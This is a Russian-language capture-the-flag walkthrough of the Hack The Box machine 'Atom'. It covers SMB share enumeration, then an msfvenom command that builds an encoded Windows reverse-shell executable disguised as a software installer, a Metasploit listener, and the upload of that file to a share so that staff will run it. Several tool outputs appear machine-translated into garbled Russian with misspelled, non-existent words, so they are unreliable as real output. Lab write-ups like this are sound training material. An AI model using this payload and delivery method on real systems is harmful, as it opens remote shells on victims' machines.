# SMB
Я попробовал вручную подключиться к SMB:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/results/10.10.10.237/scans]
└─$ smbclient -L 10.10.10.237 \\\\atom\\shares
Enter WORKGROUP\mac's password: 
┌──(mac㉿kali)-[~/Documents/HTB/atom/results/10.10.10.237/scans]
└─$ smbclient -L 10.10.10.237 -U null -p "" \\\\atom\\shares
Enter WORKGROUP\null's password: 

	Имя общей папки       Тип      Комментарий
	---------       ----      -------
	ADMIN$          Диск      Дистанционный администратор
	C$              Диск      Основная общая папка
	IPC$            IPC       Дистанционный IPC
	Software_Updates Диск      
SMB1 отключён -- нет работающей группы
```

Autorecon и nmap провели много сканирований, но я хотел реплицировать результаты, чтобы понять, как их читать. Это повторная работа, но я раньше никогда не использовал этот сервис.

Я использовал `smbmap`, чтобы проверить, какие общие папки можно прочитать.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ smbmap -H 10.10.10.237
[!] Ошибка аутентификации на 10.10.10.237
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ smbmap -H 10.10.10.237 -u null -p ""
[+] Сессию гостя    IP: 10.10.10.237:445 Имя: 10.10.10.237                                      
        Диск                                                  	Правации      Комментарий
	----                                                  	-----------      -------
	ADMIN$                                            	НЕ ДОСТУПА   Дистанционный администратор
	C$                                                	НЕ ДОСТУПА   Основная общая папка
	IPC$                                              	ТОЛЬКО ЧТЕТИРА   Дистанционный IPC
	Software_Updates Диск      
```

После этого получилось прочитать файл `UAT_Testing_Procedures.pdf`:

```bash
smb: \> get UAT_Testing_Procedures.pdf 
getting file \UAT_Testing_Procedures.pdf of size 35202 as \UAT_Testing_Procedures.pdf (243.8 KiloBytes/sec) (average 243.8 KiloBytes/sec)
smb: \> exit
```

В файле содержится интересная информация:

![[Pasted image 20210420170103.png]]

Она указывает, что текущая приложение совсем не взаимодействует с сервером, но сервер активен. Возможно, на домене есть API, с которым можно взаимодействовать.

Также говорится, что загрузка `exe` файла в один из директорий `client` через Samba заставит `QA team` запустить его. Поэтому, если создать злонамеренный `exe`, возможно получить сокет.

### Генерация полезного файла
Для создания злонамеренного `exe` использовал msfvenom:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/results/10.10.10.237/scans]
└─$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.14.167 LPORT=9001 -b "\x00" -e x86/shikata_ga_nai -f exe -o "heedv1 Setup 1.0.1.exe"
Found 1 compatible encoders
```

После этого настроил слушатель с помощью модуля `handler`, чтобы убедиться, что настройки совпадают с шеллкодом:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/heed_source]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.167
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.167:9001
```

Затем снова войдёшь в SMB сервер и отправишь файл:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/results/10.10.10.237/scans]
└─$ smbclient //10.10.10.237/Software_Updates
Enter WORKGROUP\mac's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Apr 21 21:00:02 2021
  ..                                  D        0  Wed Apr 21 21:00:02 2021
  client1                             D        0  Wed Apr 21 21:00:02 2021
  client2                             D        0  Wed Apr 21 21:00:02 2021
  client3                             D        0  Wed Apr 21 21:00:02 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 12:18:08 2021

		4413951 blocks of size 4096. 1349120 blocks available
smb: \> cd client1
smb: \client1\> dir
  .                                   D        0  Wed Apr 21 21:00:43 2021
  ..                                  D        0  Wed Apr 21 21:00:43 2021

		4413951 blocks of size 4096. 1343670 blocks available
smb: \client1\> put "heedv1 Setup 1.0.1.exe"
putting file Heedv1 Setup 1.0.1.exe as \client1\heedv1 Setup 1.0.1.exe (294.2 kb/s) (average 294.2 kb/s)
```

После небольшого ожидания результат не появился, поэтому я понял, что это не подходящий механизм активации.

Я немного времени уделял анализу `.exe` в Ghidra, но это оказалось не нужно, и в итоге отказался от попыток — [0xdf](https://0xdf.gitlab.io/2021/07/10/htb-atom.html#heed-re) провёл некоторые интересные работы с реверсингом, что облегчило поиск следующего CVE.
